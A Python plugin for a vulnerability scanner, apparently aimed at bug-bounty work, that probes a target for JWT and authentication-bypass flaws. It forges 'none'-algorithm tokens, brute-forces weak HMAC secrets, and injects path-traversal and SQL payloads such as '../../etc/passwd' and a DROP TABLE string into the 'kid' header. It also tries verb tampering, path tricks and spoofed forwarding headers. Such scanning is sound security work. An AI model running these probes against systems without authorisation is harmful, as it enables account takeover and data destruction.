"""
JWT (JSON Web Token) and Authentication Bypass Plugin
Detects vulnerabilities in JWT implementation and authentication mechanisms

Vulnerabilities detected:
- JWT None algorithm bypass
- Weak JWT secrets (brute force)
- JWT kid (Key ID) manipulation
- Algorithm confusion (RS256 to HS256)
- JWT header injection
- Session fixation
- Auth bypass via HTTP verb tampering
- Auth bypass via path normalization
- Missing authentication checks
"""

import re
import json
import base64
import hashlib
from typing import List, Dict, Any
from urllib.parse import urlparse, urlunparse
from scanner.plugins.base import BasePlugin


class Plugin(BasePlugin):
    """JWT and authentication bypass detection"""

    name = "jwt_auth"

    # Common weak JWT secrets
    WEAK_SECRETS = [
        "secret", "Secret", "SECRET",
        "password", "123456", "12345678",
        "jwt", "token", "key",
        "your-256-bit-secret", "your-secret-key",
        "change-me", "changeme",
    ]

    # HTTP headers that might contain JWT
    JWT_HEADERS = [
        "Authorization",
        "X-Authorization",
        "X-Auth-Token",
        "X-JWT",
        "Bearer",
        "Token",
    ]

    def __init__(self):
        self.description = "Detects JWT and authentication bypass vulnerabilities"

    async def run(self, target: str, requester, oast_server: str = None) -> List[Dict[str, Any]]:
        """Main entry point"""
        findings = []

        # Make initial request to get response headers
        response = await requester.get(target)
        if not response or not isinstance(response, dict):
            return findings

        headers = response.get("headers", {})
        cookies = headers.get("set-cookie", "")

        # Extract JWT from response
        jwt_token = self._extract_jwt(headers, cookies)

        if jwt_token:
            # Test JWT vulnerabilities
            findings.extend(await self._test_jwt_none_algorithm(target, jwt_token, requester))
            findings.extend(await self._test_jwt_weak_secret(target, jwt_token, requester))
            findings.extend(await self._test_jwt_kid_manipulation(target, jwt_token, requester))
            findings.extend(await self._test_algorithm_confusion(target, jwt_token, requester))

        # Test general authentication bypasses
        findings.extend(await self._test_verb_tampering(target, requester))
        findings.extend(await self._test_path_normalization(target, requester))
        findings.extend(await self._test_header_injection(target, requester))

        return findings

    def _extract_jwt(self, headers: dict, cookies: str) -> str:
        """Extract JWT token from headers or cookies"""

        # Check Authorization header
        auth_header = headers.get("authorization", "") or headers.get("Authorization", "")
        if "Bearer " in auth_header:
            return auth_header.replace("Bearer ", "").strip()

        # Check other common headers
        for header_name in self.JWT_HEADERS:
            if header_name.lower() in headers:
                token = headers[header_name.lower()]
                if self._is_jwt(token):
                    return token

        # Check cookies
        if cookies:
            matches = re.findall(r'([a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+)', cookies)
            for match in matches:
                if self._is_jwt(match):
                    return match

        return None

    def _is_jwt(self, token: str) -> bool:
        """Check if string is a valid JWT format"""
        parts = token.split('.')
        if len(parts) != 3:
            return False

        try:
            # Try to decode header
            header = base64.urlsafe_b64decode(parts[0] + '==')
            header_json = json.loads(header)
            return 'alg' in header_json
        except Exception:
            return False

    def _decode_jwt(self, token: str) -> tuple:
        """Decode JWT to (header, payload, signature)"""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return None, None, None

            # Decode header
            header_bytes = base64.urlsafe_b64decode(parts[0] + '==')
            header = json.loads(header_bytes)

            # Decode payload
            payload_bytes = base64.urlsafe_b64decode(parts[1] + '==')
            payload = json.loads(payload_bytes)

            signature = parts[2]

            return header, payload, signature
        except Exception:
            return None, None, None

    def _encode_jwt(self, header: dict, payload: dict, signature: str = "") -> str:
        """Encode JWT from components"""
        try:
            # Encode header
            header_bytes = json.dumps(header, separators=(',', ':')).encode()
            header_b64 = base64.urlsafe_b64encode(header_bytes).decode().rstrip('=')

            # Encode payload
            payload_bytes = json.dumps(payload, separators=(',', ':')).encode()
            payload_b64 = base64.urlsafe_b64encode(payload_bytes).decode().rstrip('=')

            return f"{header_b64}.{payload_b64}.{signature}"
        except Exception:
            return None

    async def _test_jwt_none_algorithm(self, url: str, jwt_token: str, requester) -> List[Dict[str, Any]]:
        """Test JWT None algorithm bypass (CVE-2015-9235)"""
        findings = []

        header, payload, _ = self._decode_jwt(jwt_token)
        if not header or not payload:
            return findings

        # Modify header to use 'none' algorithm
        header['alg'] = 'none'

        # Try different variations
        none_variations = [
            self._encode_jwt(header, payload, ""),  # Empty signature
            self._encode_jwt(header, payload, "."),  # Dot only
        ]

        # Also try 'None', 'NONE', 'nOnE' (case variations)
        for case_variant in ['None', 'NONE', 'nOnE']:
            header_variant = header.copy()
            header_variant['alg'] = case_variant
            none_variations.append(self._encode_jwt(header_variant, payload, ""))

        for modified_token in none_variations:
            if not modified_token:
                continue

            # Test the modified token
            test_headers = {"Authorization": f"Bearer {modified_token}"}
            response = await requester.get(url, headers=test_headers)

            if response and response.get("status") in [200, 201]:
                findings.append({
                    "type": "jwt_none_algorithm",
                    "message": "CRITICAL: JWT None algorithm bypass - authentication can be bypassed",
                    "original_token": jwt_token[:50] + "...",
                    "malicious_token": modified_token[:50] + "...",
                    "location": url,
                    "severity": "critical",
                    "confidence": "firm",
                    "impact": "Complete authentication bypass - attacker can forge any JWT",
                    "bounty_potential": "$5,000 - $50,000+",
                    "cvss": "9.8 (Critical)",
                    "reference": "CVE-2015-9235",
                })
                break  # Found one, no need to test others

        return findings

    async def _test_jwt_weak_secret(self, url: str, jwt_token: str, requester) -> List[Dict[str, Any]]:
        """Test for weak JWT secrets"""
        findings = []

        header, payload, signature = self._decode_jwt(jwt_token)
        if not header or not payload:
            return findings

        alg = header.get('alg', '')
        if alg not in ['HS256', 'HS384', 'HS512']:
            return findings  # Only test HMAC algorithms

        # Try to brute force with weak secrets
        for secret in self.WEAK_SECRETS[:5]:  # Test top 5 for speed
            try:
                import hmac

                # Reconstruct the message
                parts = jwt_token.split('.')
                message = f"{parts[0]}.{parts[1]}".encode()

                # Hash algorithm mapping
                hash_algo = {
                    'HS256': hashlib.sha256,
                    'HS384': hashlib.sha384,
                    'HS512': hashlib.sha512,
                }.get(alg, hashlib.sha256)

                # Generate signature with weak secret
                calculated_sig = base64.urlsafe_b64encode(
                    hmac.new(secret.encode(), message, hash_algo).digest()
                ).decode().rstrip('=')

                if calculated_sig == signature:
                    findings.append({
                        "type": "jwt_weak_secret",
                        "message": f"CRITICAL: JWT signed with weak secret: '{secret}'",
                        "weak_secret": secret,
                        "algorithm": alg,
                        "location": url,
                        "severity": "critical",
                        "confidence": "firm",
                        "impact": "Attacker can forge arbitrary JWTs with known secret",
                        "bounty_potential": "$10,000 - $100,000+",
                        "cvss": "9.1 (Critical)",
                    })
                    break

            except Exception:
                continue

        return findings

    async def _test_jwt_kid_manipulation(self, url: str, jwt_token: str, requester) -> List[Dict[str, Any]]:
        """Test JWT kid (Key ID) parameter manipulation"""
        findings = []

        header, payload, _ = self._decode_jwt(jwt_token)
        if not header or not payload:
            return findings

        # Test SQL injection in kid
        kid_sqli_payloads = [
            "../../../dev/null",  # Path traversal
            "/dev/null",
            "../../etc/passwd",
            "' OR '1'='1",  # SQLi
            "'; DROP TABLE keys;--",
        ]

        for kid_payload in kid_sqli_payloads:
            header_modified = header.copy()
            header_modified['kid'] = kid_payload
            header_modified['alg'] = 'HS256'

            # Create token with manipulated kid
            modified_token = self._encode_jwt(header_modified, payload, "")

            if modified_token:
                test_headers = {"Authorization": f"Bearer {modified_token}"}
                response = await requester.get(url, headers=test_headers)

                if response:
                    status = response.get("status", 0)
                    content = response.get("text", "")

                    if status in [200, 201] or "sql" in content.lower() or "error" in content.lower():
                        findings.append({
                            "type": "jwt_kid_manipulation",
                            "message": "JWT kid parameter vulnerable to injection",
                            "kid_payload": kid_payload,
                            "location": url,
                            "severity": "high",
                            "confidence": "tentative",
                            "impact": "Possible file inclusion or SQL injection via JWT kid parameter",
                            "bounty_potential": "$2,000 - $25,000+",
                        })
                        break

        return findings

    async def _test_algorithm_confusion(self, url: str, jwt_token: str, requester) -> List[Dict[str, Any]]:
        """Test RS256 to HS256 algorithm confusion attack"""
        findings = []

        header, payload, _ = self._decode_jwt(jwt_token)
        if not header or not payload:
            return findings

        original_alg = header.get('alg', '')

        # If token uses RS256, try changing to HS256
        if original_alg in ['RS256', 'RS384', 'RS512']:
            header_modified = header.copy()
            header_modified['alg'] = 'HS256'

            # Create modified token (signature won't be valid but server might accept it)
            modified_token = self._encode_jwt(header_modified, payload, "dummy")

            if modified_token:
                test_headers = {"Authorization": f"Bearer {modified_token}"}
                response = await requester.get(url, headers=test_headers)

                if response and response.get("status") in [200, 201]:
                    findings.append({
                        "type": "jwt_algorithm_confusion",
                        "message": "CRITICAL: Algorithm confusion attack - RS256 to HS256",
                        "original_algorithm": original_alg,
                        "confused_algorithm": "HS256",
                        "location": url,
                        "severity": "critical",
                        "confidence": "firm",
                        "impact": "Can forge JWTs by using public key as HMAC secret",
                        "bounty_potential": "$5,000 - $75,000+",
                        "reference": "CVE-2016-5431",
                    })

        return findings

    async def _test_verb_tampering(self, url: str, requester) -> List[Dict[str, Any]]:
        """Test HTTP verb tampering for auth bypass"""
        findings = []

        # Test with different HTTP methods
        methods = ["POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"]

        baseline = await requester.get(url)
        baseline_status = baseline.get("status", 0) if baseline else 0

        # If baseline is unauthorized, try other methods
        if baseline_status in [401, 403]:
            for method in methods:
                try:
                    if method == "POST":
                        response = await requester.post(url, data={})
                    elif method == "PUT":
                        response = await requester.put(url, data={})
                    elif method == "DELETE":
                        response = await requester.delete(url)
                    else:
                        continue  # Skip others for now

                    if response and response.get("status") in [200, 201]:
                        findings.append({
                            "type": "http_verb_tampering",
                            "message": f"Authentication bypass via HTTP verb tampering",
                            "original_method": "GET",
                            "bypass_method": method,
                            "location": url,
                            "severity": "high",
                            "confidence": "firm",
                            "impact": "Can bypass authentication by changing HTTP method",
                            "bounty_potential": "$1,000 - $15,000+",
                        })
                        break

                except Exception:
                    pass

        return findings

    async def _test_path_normalization(self, url: str, requester) -> List[Dict[str, Any]]:
        """Test path normalization bypasses"""
        findings = []

        parsed = urlparse(url)
        original_path = parsed.path

        # Path normalization payloads
        bypass_paths = [
            original_path + "/",  # Trailing slash
            original_path + "/.",  # Trailing /.
            original_path + "//",  # Double slash
            original_path.replace("/", "//"),  # All slashes doubled
            "/" + original_path.lstrip("/"),  # Ensure leading slash
            original_path + "%20",  # Trailing space
            original_path + "..;/",  # Tomcat bypass
        ]

        baseline = await requester.get(url)
        baseline_status = baseline.get("status", 0) if baseline else 0

        if baseline_status in [401, 403, 404]:
            for bypass_path in bypass_paths:
                test_url = urlunparse((
                    parsed.scheme,
                    parsed.netloc,
                    bypass_path,
                    parsed.params,
                    parsed.query,
                    parsed.fragment
                ))

                response = await requester.get(test_url)
                if response and response.get("status") in [200, 201]:
                    findings.append({
                        "type": "path_normalization_bypass",
                        "message": "Authentication bypass via path normalization",
                        "original_path": original_path,
                        "bypass_path": bypass_path,
                        "location": url,
                        "severity": "high",
                        "confidence": "firm",
                        "impact": "Can bypass authentication via URL manipulation",
                        "bounty_potential": "$1,000 - $20,000+",
                    })
                    break

        return findings

    async def _test_header_injection(self, url: str, requester) -> List[Dict[str, Any]]:
        """Test authentication bypass via header injection"""
        findings = []

        # Common headers that might bypass authentication
        bypass_headers = {
            "X-Original-URL": "/admin",
            "X-Rewrite-URL": "/admin",
            "X-Forwarded-For": "127.0.0.1",
            "X-Forwarded-Host": "localhost",
            "X-Originating-IP": "127.0.0.1",
            "X-Remote-IP": "127.0.0.1",
            "X-Remote-Addr": "127.0.0.1",
            "X-Client-IP": "127.0.0.1",
        }

        baseline = await requester.get(url)
        baseline_status = baseline.get("status", 0) if baseline else 0

        if baseline_status in [401, 403]:
            for header_name, header_value in bypass_headers.items():
                test_headers = {header_name: header_value}
                response = await requester.get(url, headers=test_headers)

                if response and response.get("status") in [200, 201]:
                    findings.append({
                        "type": "header_injection_bypass",
                        "message": f"Authentication bypass via {header_name} header",
                        "header": header_name,
                        "value": header_value,
                        "location": url,
                        "severity": "high",
                        "confidence": "firm",
                        "impact": "Can bypass authentication via header manipulation",
                        "bounty_potential": "$2,000 - $30,000+",
                    })
                    break

        return findings


# Plugin registration
Plugin = Plugin
